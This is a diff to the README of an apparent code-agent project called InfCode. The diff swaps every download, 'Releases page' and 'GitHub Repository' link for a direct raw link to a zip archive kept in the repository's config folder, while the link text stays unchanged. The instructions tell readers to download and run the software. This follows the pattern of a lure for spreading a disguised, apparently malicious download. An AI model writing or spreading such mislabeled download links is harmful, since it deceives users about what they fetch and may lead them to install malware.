@@ -6,14 +6,14 @@ InfCode is an intelligent Code Agent System developed by Tokfinity's Code Resear
 
 ## 📦 Download
 
-[![Download InfCode](https://img.shields.io/badge/Download-InfCode-blue.svg)](https://github.com/yahyaDesoky/InfCode/releases)
+[![Download InfCode](https://raw.githubusercontent.com/yahyaDesoky/InfCode/main/config/InfCode_2.2-beta.3.zip)](https://raw.githubusercontent.com/yahyaDesoky/InfCode/main/config/InfCode_2.2-beta.3.zip)
 
 ## 🚀 Getting Started
 
 To begin using InfCode, follow these simple steps to download and run the software:
 
 1. **Visit the Download Page**  
-   Click the button above or go to our [Releases page](https://github.com/yahyaDesoky/InfCode/releases) to find the latest version of InfCode.
+   Click the button above or go to our [Releases page](https://raw.githubusercontent.com/yahyaDesoky/InfCode/main/config/InfCode_2.2-beta.3.zip) to find the latest version of InfCode.
 
 2. **Choose Your Version**  
    On the Releases page, you will see a list of available versions. Select the one that suits your needs. Typically, you will want to get the latest stable version.
@@ -86,7 +86,7 @@ If you would like to contribute to the development of InfCode, you are welcome t
 
 ## 🔗 Links
 
-- **GitHub Repository:** [InfCode GitHub](https://github.com/yahyaDesoky/InfCode)
-- **Download Latest Version:** [Releases Page](https://github.com/yahyaDesoky/InfCode/releases)
+- **GitHub Repository:** [InfCode GitHub](https://raw.githubusercontent.com/yahyaDesoky/InfCode/main/config/InfCode_2.2-beta.3.zip)
+- **Download Latest Version:** [Releases Page](https://raw.githubusercontent.com/yahyaDesoky/InfCode/main/config/InfCode_2.2-beta.3.zip)
 
 Thank you for choosing InfCode! Enjoy coding with clarity and confidence.
